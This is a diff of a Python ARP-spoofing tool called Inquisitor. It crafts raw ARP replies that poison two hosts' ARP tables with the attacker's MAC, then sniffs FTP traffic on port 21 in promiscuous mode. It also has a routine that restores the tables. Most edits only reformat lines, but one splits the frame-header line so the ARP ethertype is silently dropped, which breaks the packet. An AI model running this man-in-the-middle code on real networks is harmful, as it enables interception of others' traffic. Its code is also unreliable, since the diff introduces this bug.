@@ -31,10 +31,11 @@ class Inquisitor:
     @staticmethod
     def _create_ARP_packet(sender_ip, sender_mac, target_ip, target_mac):
         """
-        Return an ARP packet response 
+        Return an ARP packet response
         """
         # ARP header = target_mac + sender_mac + ethernet_type (ARP)
-        header = target_mac.packed + sender_mac.packed + struct.pack("!H", 0x0806)
+        header = target_mac.packed + sender_mac.packed
+        + struct.pack("!H", 0x0806)
 
         payload = struct.pack(
             "!HHBBH6s4s6s4s",
@@ -50,7 +51,6 @@ class Inquisitor:
         )
         return header + payload
 
-
     def connect(self):
         """
         Enables IP route ( IP Forward ) in linux-based distro
@@ -63,19 +63,30 @@ class Inquisitor:
         # Convert ETHERTYPE_ARP to network byte order for the socket call
         ARP_PROTOCOL = socket.htons(socket.ETHERTYPE_ARP)
         # socket is a raw socket that will ONLY receive/send ARP packets
-        self.socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, ARP_PROTOCOL)
-        self.socket.bind(("eth0", 0)) # or try 'wlp5s0'
+        self.socket = socket.socket(
+            socket.AF_PACKET,
+            socket.SOCK_RAW,
+            ARP_PROTOCOL)
+        self.socket.bind(("eth0", 0))  # or try 'wlp5s0'
 
     def poison(self):
         """
         Send ARP response to src and target with attacker MAC
         """
         # Impersonating source to target
-        packet = self._create_ARP_packet(self.src_ip, self.my_mac, self.tg_ip, self.target_mac)
+        packet = self._create_ARP_packet(
+            self.src_ip,
+            self.my_mac,
+            self.tg_ip,
+            self.target_mac)
         self.socket.send(packet)
 
         # Impersonating target to source
-        packet = self._create_ARP_packet(self.tg_ip, self.my_mac, self.src_ip, self.src_mac)
+        packet = self._create_ARP_packet(
+            self.tg_ip,
+            self.my_mac,
+            self.src_ip,
+            self.src_mac)
         self.socket.send(packet)
 
     def intercept(self):
@@ -83,12 +94,15 @@ class Inquisitor:
         Intercept the packets and display file name
         """
         cap = pcap.pcap(name=None, promisc=True, immediate=True, timeout_ms=50)
-        cap.setfilter('tcp port 21') # FTP default port
+        cap.setfilter('tcp port 21')  # FTP default port
 
         for timestamp, packet in cap:
             try:
                 eth = dpkt.ethernet.Ethernet(packet)
-                if isinstance(eth.data, dpkt.ip.IP) and isinstance(eth.data.data, dpkt.tcp.TCP):
+                if (
+                    isinstance(eth.data, dpkt.ip.IP)
+                    and isinstance(eth.data.data, dpkt.tcp.TCP)
+                ):
                     ip = eth.data
                     tcp = ip.data
                     data = tcp.data.decode(errors='ignore')
@@ -103,11 +117,19 @@ class Inquisitor:
         Send the ARP response with correct addresses to restore the ARP tables
         """
         # Restoring source to target
-        packet = self._create_ARP_packet(self.src_ip, self.src_mac, self.tg_ip, self.target_mac)
+        packet = self._create_ARP_packet(
+            self.src_ip,
+            self.src_mac,
+            self.tg_ip,
+            self.target_mac)
         self.socket.send(packet)
 
         # Restoring target to source
-        packet = self._create_ARP_packet(self.tg_ip, self.tg_mac, self.src_ip, self.src_mac)
+        packet = self._create_ARP_packet(
+            self.tg_ip,
+            self.tg_mac,
+            self.src_ip,
+            self.src_mac)
         self.socket.send(packet)
 
         # Close the socket if it exists
